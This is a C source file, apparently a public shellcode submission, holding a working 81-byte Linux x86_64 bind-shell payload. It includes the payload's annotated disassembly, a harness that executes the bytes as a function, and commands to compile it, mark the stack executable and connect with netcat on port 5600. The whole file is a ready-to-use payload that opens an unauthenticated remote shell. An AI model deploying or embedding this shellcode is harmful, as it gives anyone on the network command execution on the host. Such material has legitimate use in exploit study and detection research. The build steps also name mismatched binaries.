/*
---------------------------------------------------------------------------------------------------

Linux/x86_64 - bindshell (PORT: 5600) - 81 bytes

Ajith Kp [ @ajithkp560 ] [ http://www.terminalcoders.blogspot.com ]

Om Asato Maa Sad-Gamaya |
Tamaso Maa Jyotir-Gamaya |
Mrtyor-Maa Amrtam Gamaya |
Om Shaantih Shaantih Shaantih |

---------------------------------------------------------------------------------------------------
Disassembly of section .text:

0000000000400080 <.text>:
  400080:   99                      cdq
  400081:   6a 29                   push   0x29
  400083:   58                      pop    rax
  400084:   6a 01                   push   0x1
  400086:   5e                      pop    rsi
  400087:   6a 02                   push   0x2
  400089:   5f                      pop    rdi
  40008a:   0f 05                   syscall
  40008c:   48 97                   xchg   rdi,rax
  40008e:   6a 02                   push   0x2
  400090:   66 c7 44 24 02 15 e0    mov    WORD PTR [rsp+0x2],0xe015
  400097:   54                      push   rsp
  400098:   5e                      pop    rsi
  400099:   52                      push   rdx
  40009a:   6a 10                   push   0x10
  40009c:   5a                      pop    rdx
  40009d:   6a 31                   push   0x31
  40009f:   58                      pop    rax
  4000a0:   0f 05                   syscall
  4000a2:   50                      push   rax
  4000a3:   5e                      pop    rsi
  4000a4:   6a 32                   push   0x32
  4000a6:   58                      pop    rax
  4000a7:   0f 05                   syscall
  4000a9:   6a 2b                   push   0x2b
  4000ab:   58                      pop    rax
  4000ac:   0f 05                   syscall
  4000ae:   48 97                   xchg   rdi,rax
  4000b0:   6a 03                   push   0x3
  4000b2:   5e                      pop    rsi
  4000b3:   48 ff ce                dec    rsi
  4000b6:   6a 21                   push   0x21
  4000b8:   58                      pop    rax
  4000b9:   0f 05                   syscall
  4000bb:   75 f6                   jne    0x4000b3
  4000bd:   99                      cdq
  4000be:   52                      push   rdx
  4000bf:   48 b9 2f 62 69 6e 2f    movabs rcx,0x68732f2f6e69622f
  4000c6:   2f 73 68
  4000c9:   51                      push   rcx
  4000ca:   54                      push   rsp
  4000cb:   5f                      pop    rdi
  4000cc:   6a 3b                   push   0x3b
  4000ce:   58                      pop    rax
  4000cf:   0f 05                   syscall

---------------------------------------------------------------------------------------------------

How To Run

$ gcc -o bind_shell bind_shell.c
$ execstack -s sh_shell
$ ./sh_shell

How to Connect

$ nc <HOST IP ADDRESS> 5600

Eg:

$ nc 127.0.0.1 5600

---------------------------------------------------------------------------------------------------
*/
#include <stdio.h>
char sh[]="\x99\x6a\x29\x58\x6a\x01\x5e\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x50\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x99\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x51\x54\x5f\x6a\x3b\x58\x0f\x05";
void main(int argc, char **argv)
{
	int (*func)();
	func = (int (*)()) sh;
	(int)(*func)();
}